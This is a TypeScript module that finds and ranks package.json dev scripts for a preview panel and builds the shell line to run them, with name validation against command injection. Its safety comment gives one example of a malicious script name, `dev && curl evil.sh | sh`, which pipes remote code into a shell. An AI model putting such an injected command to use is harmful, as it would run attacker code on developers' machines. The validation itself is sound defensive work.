// "Nothing is listening — what would I run to start it?"
//
// The preview browser's empty state offers a dev script rather than a shrug.
// Everything here is package.json-shaped, which is deliberate: the point is to
// cover the node/next case exactly, not to guess at every ecosystem. A repo
// with no package.json simply offers nothing, and the panel says so.
//
// SAFETY POSTURE. The client picks a script by NAME and a workspace by SUBDIR;
// it never sends a command line. The server re-reads package.json, confirms the
// name is really a script there, and builds the command itself — so a crafted
// request can only ever run something the repo's own package.json already
// defines. Names outside SAFE_NAME are not offered and not runnable at all:
// the command is typed into an interactive shell, where a script literally
// named `dev && curl evil.sh | sh` would otherwise be a command injection with
// the package.json as its delivery vehicle.

import { readFile, readdir } from 'node:fs/promises';
import path from 'node:path';

export type PackageManager = 'npm' | 'pnpm' | 'yarn' | 'bun';

export interface DevScript {
  name: string;
  /** The raw package.json value, shown so you can see what Run will actually do. */
  command: string;
}

export interface ScriptGroup {
  /** Project-relative dir holding this package.json ('' = repo root). */
  subdir: string;
  manager: PackageManager;
  /** Dev-serving scripts, best candidate first. */
  scripts: DevScript[];
}

// Conservative on purpose — see the safety note above. Every real npm script
// name (`dev`, `dev:web`, `start-server`, `@scope/build`) is in this set.
const SAFE_NAME = /^[A-Za-z0-9_.:@-]+$/;

// Exact names that mean "run the app for development", best first. `dev` beats
// `start` because in a Next/Vite repo `start` serves a build that may not
// exist; `start` still wins in a plain node repo, which simply has no `dev`.
const PREFERRED = ['dev', 'develop', 'start', 'serve', 'preview'];

// Commands that betray a dev server even under an unconventional script name
// (`watch`, `local`, `up`). Ranked below the well-known names, above the rest.
const DEV_RUNNER =
  /\b(next\s+dev|next\s+start|vite|nuxt|astro|remix\s+(dev|vite-dev)|ng\s+serve|react-scripts\s+start|nodemon|tsx\s+watch|node\s+--watch|webpack(-dev)?\s+serve|rails\s+s|php\s+-S|http-server|serve\b|gatsby\s+develop|expo\s+start|sveltekit|parcel)\b/;

/** Lockfile → package manager. Takes a dir listing so it stays pure. */
export function detectManager(files: string[]): PackageManager {
  const has = (f: string) => files.includes(f);
  if (has('bun.lockb') || has('bun.lock')) return 'bun';
  if (has('pnpm-lock.yaml')) return 'pnpm';
  if (has('yarn.lock')) return 'yarn';
  return 'npm';
}

/**
 * Dev-serving scripts from a package.json `scripts` map, best candidate first.
 *
 * Scripts that look like a one-shot task (build, test, lint, typecheck) are
 * dropped entirely — offering "Run" next to `npm run test` in a browser panel
 * would be a trap. Ties break on name so the order is stable across calls.
 */
export function rankScripts(scripts: Record<string, unknown>): DevScript[] {
  const rank = (name: string, cmd: string): number => {
    const exact = PREFERRED.indexOf(name);
    if (exact !== -1) return exact;
    if (/^(dev|start|serve|preview)[:-]/.test(name)) return 10;
    if (DEV_RUNNER.test(cmd)) return 20;
    return 99; // not a dev script — filtered out below
  };
  return Object.entries(scripts)
    .filter((e): e is [string, string] => typeof e[1] === 'string' && SAFE_NAME.test(e[0]))
    .map(([name, command]) => ({ name, command, r: rank(name, command) }))
    .filter((s) => s.r < 99)
    .sort((a, b) => a.r - b.r || a.name.localeCompare(b.name))
    .map(({ name, command }) => ({ name, command }));
}

/**
 * The shell line to type into a scratch terminal.
 *
 * `cd` is prefixed rather than spawning the shell elsewhere because the scratch
 * terminal's cwd is the SESSION's cwd (worktree-correct, per scratch.ts) and
 * that is the thing we want to stay anchored to — a monorepo subdir is a step
 * down from it, not a different checkout.
 */
export function runLine(
  manager: PackageManager,
  script: string,
  subdir = '',
  platform: NodeJS.Platform = process.platform,
): string {
  // yarn/pnpm take a bare script name; npm and bun need `run`.
  const run =
    manager === 'yarn' || manager === 'pnpm' ? `${manager} ${script}` : `${manager} run ${script}`;
  if (!subdir) return run;
  const win = platform === 'win32';
  // `cd /d` on cmd handles a drive change; the quotes handle spaces. On posix,
  // single quotes with the standard '\'' escape.
  const dir = win ? subdir.split('/').join('\\') : subdir;
  const cd = win ? `cd /d "${dir}"` : `cd '${dir.replace(/'/g, "'\\''")}'`;
  return `${cd} && ${run}`;
}

/** package.json `workspaces` in either supported shape. */
function workspacePatterns(pkg: Record<string, unknown>): string[] {
  const ws = pkg.workspaces;
  if (Array.isArray(ws)) return ws.filter((p): p is string => typeof p === 'string');
  if (ws && typeof ws === 'object') {
    const packages = (ws as { packages?: unknown }).packages;
    if (Array.isArray(packages)) return packages.filter((p): p is string => typeof p === 'string');
  }
  return [];
}

// Bounded: a monorepo can have hundreds of packages and this list is a dropdown,
// not a search. The root package is always included regardless of the cap.
const MAX_GROUPS = 24;

/**
 * Expand `apps/*` style patterns one level. Anything fancier (`packages/**`,
 * negations) resolves to its literal prefix dir — the panel offers the root
 * script in that case, which is the common answer for a monorepo anyway.
 */
async function expandPattern(root: string, pattern: string): Promise<string[]> {
  const star = pattern.indexOf('*');
  if (star === -1) return [pattern];
  const prefix = pattern.slice(0, star).replace(/\/$/, '');
  try {
    const entries = await readdir(path.join(root, prefix), { withFileTypes: true });
    return entries.filter((e) => e.isDirectory()).map((e) => (prefix ? `${prefix}/${e.name}` : e.name));
  } catch {
    return [];
  }
}

async function readPkg(dir: string): Promise<Record<string, unknown> | null> {
  try {
    const raw = await readFile(path.join(dir, 'package.json'), 'utf8');
    const parsed: unknown = JSON.parse(raw);
    return parsed && typeof parsed === 'object' ? (parsed as Record<string, unknown>) : null;
  } catch {
    return null; // absent or malformed — indistinguishable to the caller, and both mean "no scripts"
  }
}

async function groupFor(root: string, subdir: string): Promise<ScriptGroup | null> {
  const dir = subdir ? path.join(root, subdir) : root;
  const pkg = await readPkg(dir);
  if (!pkg) return null;
  const scriptsRaw = pkg.scripts;
  if (!scriptsRaw || typeof scriptsRaw !== 'object') return null;
  const scripts = rankScripts(scriptsRaw as Record<string, unknown>);
  if (scripts.length === 0) return null;
  const files = await readdir(dir).catch(() => [] as string[]);
  return { subdir, manager: detectManager(files), scripts };
}

/**
 * Dev scripts for a repo: the root package, plus each workspace that has one.
 *
 * The root comes first because it is the answer most of the time; workspaces
 * follow in declaration order so a monorepo's `apps/web` sits where you expect.
 * A workspace whose package manager differs from the root's is reported with
 * its own — the lockfile is per-dir here on purpose, since that is what someone
 * running a command in that dir would get.
 */
export async function findScriptGroups(root: string): Promise<ScriptGroup[]> {
  const rootPkg = await readPkg(root);
  const groups: ScriptGroup[] = [];
  const rootGroup = await groupFor(root, '');
  if (rootGroup) groups.push(rootGroup);
  if (!rootPkg) return groups;

  const subdirs: string[] = [];
  for (const pattern of workspacePatterns(rootPkg)) {
    for (const d of await expandPattern(root, pattern)) {
      if (!subdirs.includes(d)) subdirs.push(d);
    }
  }
  for (const subdir of subdirs.slice(0, MAX_GROUPS)) {
    const g = await groupFor(root, subdir);
    if (g) groups.push(g);
  }
  return groups;
}

/**
 * Resolve a client's (subdir, script) pick against what the repo actually
 * declares, returning the command to type — or null if the pick is not a real
 * dev script there. Fail closed: this is the only path from a request to a
 * command line, so an unknown name gets no command at all.
 */
export async function resolveRunLine(
  root: string,
  subdir: string,
  script: string,
): Promise<{ command: string; manager: PackageManager } | null> {
  if (!SAFE_NAME.test(script)) return null;
  const groups = await findScriptGroups(root);
  const group = groups.find((g) => g.subdir === subdir);
  if (!group || !group.scripts.some((s) => s.name === script)) return null;
  return { command: runLine(group.manager, script, group.subdir), manager: group.manager };
}
